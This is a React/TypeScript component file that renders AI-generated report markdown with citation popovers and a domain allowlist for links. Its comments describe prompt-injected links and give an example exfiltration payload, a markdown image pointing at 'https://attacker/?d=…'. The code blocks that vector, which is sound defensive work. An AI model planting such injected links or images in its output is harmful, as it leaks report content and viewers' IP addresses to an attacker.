"use client";

import { createContext, memo, useCallback, useContext, useEffect, useId, useMemo, useRef, useState, type ReactNode } from "react";
import { createPortal } from "react-dom";
import Markdown, { type Components, type ExtraProps } from "react-markdown";
import remarkGfm from "remark-gfm";
import type { TaskSource } from "@/lib/api";
import { citeFromProps, remarkCitations } from "./cites";
import { linkAllowed, linkAllowlist } from "./markdown";
import { sourceDomain, sourceInitial, sourceLabel } from "./shared";
import s from "./report.module.css";

// ---------- Citation context ----------

interface CiteCtx {
  byN: Map<number, TaskSource>;
  /** Scroll to a source in the Sources panel (absent when there is no panel). */
  jump?: (n: number) => void;
  /** Id prefix of the Sources panel items (`<prefix>-src-<n>`). */
  prefix: string;
  /** DOM id a citation points at, when it isn't the Sources panel (e.g. the console's Evidence list). */
  targetId?: (n: number) => string;
  /** The domains links may go to (linkAllowlist): any other link in the markdown is shown as its text. */
  linkDomains: string[];
}

const CiteContext = createContext<CiteCtx | null>(null);

export function CiteProvider({
  sources,
  linkDomains,
  jump,
  prefix = "r",
  targetId,
  children,
}: {
  sources: TaskSource[];
  /** The domains the report may link to (from the API); defaults to the sources' domains. */
  linkDomains?: string[] | null;
  jump?: (n: number) => void;
  prefix?: string;
  targetId?: (n: number) => string;
  children: ReactNode;
}) {
  const value = useMemo<CiteCtx>(
    () => ({ byN: new Map(sources.map((x) => [x.n, x])), jump, prefix, targetId, linkDomains: linkAllowlist(linkDomains, sources) }),
    [sources, linkDomains, jump, prefix, targetId]
  );
  return <CiteContext.Provider value={value}>{children}</CiteContext.Provider>;
}

/** DOM id of a source row in the Sources panel. */
export const sourceDomId = (prefix: string, n: number) => `${prefix}-src-${n}`;

/** An absolute http(s) URL with a host ("https://host…"; not "https:///host" or "https:\\host"). */
const ABSOLUTE_HTTP = /^https?:\/\/[^\s/\\]/i;

// ---------- Citation chip with popover ----------

function Cite({ n }: { n: number }) {
  const ctx = useContext(CiteContext);
  const src = ctx?.byN.get(n);
  const ref = useRef<HTMLAnchorElement>(null);
  const [pos, setPos] = useState<{ top: number; left: number; above: boolean } | null>(null);
  const hideTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const id = useId();

  const show = useCallback(() => {
    if (hideTimer.current) clearTimeout(hideTimer.current);
    const el = ref.current;
    if (!el || !src) return;
    const r = el.getBoundingClientRect();
    const vw = window.innerWidth;
    const w = Math.min(320, vw - 24);
    const left = Math.max(12, Math.min(r.left + r.width / 2 - w / 2, vw - w - 12));
    const above = r.top > 210;
    setPos({ top: above ? r.top - 8 : r.bottom + 8, left, above });
  }, [src]);

  const hide = useCallback(() => {
    if (hideTimer.current) clearTimeout(hideTimer.current);
    hideTimer.current = setTimeout(() => setPos(null), 60);
  }, []);

  useEffect(() => {
    if (!pos) return;
    const close = () => setPos(null);
    window.addEventListener("scroll", close, { passive: true, capture: true });
    window.addEventListener("resize", close);
    return () => {
      window.removeEventListener("scroll", close, { capture: true });
      window.removeEventListener("resize", close);
    };
  }, [pos]);

  useEffect(() => () => {
    if (hideTimer.current) clearTimeout(hideTimer.current);
  }, []);

  if (!src) {
    return (
      <sup className={s.sup}>
        <span className={`${s.cite} ${s.citeMissing}`}>{n}</span>
      </sup>
    );
  }

  const domain = sourceDomain(src);
  const popId = `cite-${id.replace(/:/g, "")}`;
  const external = !ctx?.jump && src.url && ABSOLUTE_HTTP.test(src.url) ? src.url : null;
  return (
    <sup className={s.sup}>
      <a
        ref={ref}
        href={external ?? `#${ctx?.targetId ? ctx.targetId(n) : sourceDomId(ctx?.prefix ?? "r", n)}`}
        {...(external ? { target: "_blank", rel: "noopener noreferrer" } : {})}
        className={s.cite}
        aria-label={`Source ${n}: ${src.title}`}
        aria-describedby={pos ? popId : undefined}
        data-open={pos ? "true" : undefined}
        onMouseEnter={show}
        onMouseLeave={hide}
        onFocus={show}
        onBlur={hide}
        onKeyDown={(e) => {
          if (e.key === "Escape") setPos(null);
        }}
        onClick={(e) => {
          if (!ctx?.jump) return;
          e.preventDefault();
          setPos(null);
          ctx.jump(n);
        }}
      >
        {n}
      </a>
      {pos &&
        typeof document !== "undefined" &&
        createPortal(
          <div id={popId} role="tooltip" className={`${s.pop} ${pos.above ? s.popAbove : ""}`} style={{ top: pos.top, left: pos.left }}>
            <div className={s.popHead}>
              <span className={s.badge} aria-hidden="true">
                {sourceInitial(src)}
              </span>
              <div style={{ minWidth: 0 }}>
                <div className={s.popTitle}>{src.title}</div>
                <div className={s.popMeta}>
                  [{n}] · {domain ? `${domain} · ` : ""}
                  {sourceLabel(src)}
                </div>
              </div>
            </div>
            {src.snippet && <div className={s.popSnippet}>{src.snippet}</div>}
            {ctx?.jump && <div className={s.popHint}>{ctx.targetId ? "Click to see it in Evidence" : "Click to see it in Sources"}</div>}
          </div>,
          document.body
        )}
    </sup>
  );
}

// ---------- Markdown renderer ----------

const cell = { whiteSpace: "normal", verticalAlign: "top", minWidth: 110 } as const;

/**
 * Whether a link in report markdown can be a link at all: an absolute http(s) URL, or an in-page
 * #anchor (footnotes). Anything else from model output — protocol-relative "//host",
 * "javascript:", "data:", "mailto:", relative paths, or an href the URL transform emptied —
 * is shown as its text.
 */
export function isLinkableHref(href: string | null | undefined): href is string {
  return !!href && (ABSOLUTE_HTTP.test(href) || href.startsWith("#"));
}

/**
 * A link in report markdown. Model output may carry a prompt-injected link, so only an in-page
 * #anchor or a URL on a domain the report may link to (the CiteContext's linkDomains, see
 * linkAllowed) stays a link, however the markdown spelled it; anything else is shown as its text.
 * This holds whatever the stored text is: the executor's link cleaner is a separate layer.
 */
function ReportLink({ node: _node, href, ...props }: JSX.IntrinsicElements["a"] & ExtraProps) {
  const allowed = useContext(CiteContext)?.linkDomains ?? [];
  if (!isLinkableHref(href) || !linkAllowed(href, allowed)) return <span>{props.children}</span>;
  return <a href={href} {...props} {...(href.startsWith("#") ? {} : { target: "_blank", rel: "noopener noreferrer" })} />;
}

const components: Components = {
  table: ({ node: _node, ...props }) => (
    <div className="tw not-prose" style={{ margin: "16px 0" }}>
      <table {...props} />
    </div>
  ),
  th: ({ node: _node, style, ...props }) => <th style={{ ...cell, ...style }} {...props} />,
  td: ({ node: _node, style, ...props }) => <td style={{ ...cell, ...style }} {...props} />,
  a: ReportLink,
  // Never load images from model output: the browser fetches an image as soon
  // as the report is viewed, so a prompt-injected ![](https://attacker/?d=…)
  // would leak report content (and the viewer's IP) with zero clicks. Show the alt text.
  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
  sup: ({ node, children, ...props }) => {
    const n = citeFromProps(node?.properties);
    if (n !== null) return <Cite n={n} />;
    return <sup {...props}>{children}</sup>;
  },
};

export interface ReportMarkdownProps {
  children: string;
  /** Sources whose numbers become citation chips. */
  sources?: TaskSource[] | null;
  /**
   * The domains links may go to (the API's linkDomains). Default: the surrounding CiteProvider's,
   * or without one, these sources' domains.
   */
  linkDomains?: string[] | null;
  small?: boolean;
  className?: string;
}

/** Report markdown (GFM tables, allowlisted links) with [n] citations turned into chips. */
export const ReportMarkdown = memo(function ReportMarkdown({ children, sources, linkDomains, small, className }: ReportMarkdownProps) {
  const ctx = useContext(CiteContext);
  const valid = useMemo(() => new Set((sources ?? []).map((x) => x.n)), [sources]);
  const plugins = useMemo(() => [remarkGfm, [remarkCitations, { valid }]] as NonNullable<Parameters<typeof Markdown>[0]["remarkPlugins"]>, [valid]);
  // Its own link allowlist when given one, or when no provider gives one (citation chips stay the provider's).
  const own = useMemo<CiteCtx | null>(
    () => (linkDomains || !ctx ? { ...(ctx ?? { byN: new Map(), prefix: "r" }), linkDomains: linkAllowlist(linkDomains, sources) } : null),
    [ctx, linkDomains, sources]
  );
  const body = (
    <div className={["prose max-w-none", small && "prose-sm", className].filter(Boolean).join(" ")}>
      <Markdown remarkPlugins={plugins} components={components}>
        {children}
      </Markdown>
    </div>
  );
  return own ? <CiteContext.Provider value={own}>{body}</CiteContext.Provider> : body;
});

/** Wraps ReportMarkdown so citations work even without a surrounding ReportView. */
export function CitedMarkdown({ sources, linkDomains, ...rest }: ReportMarkdownProps) {
  const list = useMemo(() => sources ?? [], [sources]);
  const ctx = useContext(CiteContext);
  if (ctx) return <ReportMarkdown sources={list} linkDomains={linkDomains} {...rest} />;
  return (
    <CiteProvider sources={list} linkDomains={linkDomains}>
      <ReportMarkdown sources={list} {...rest} />
    </CiteProvider>
  );
}
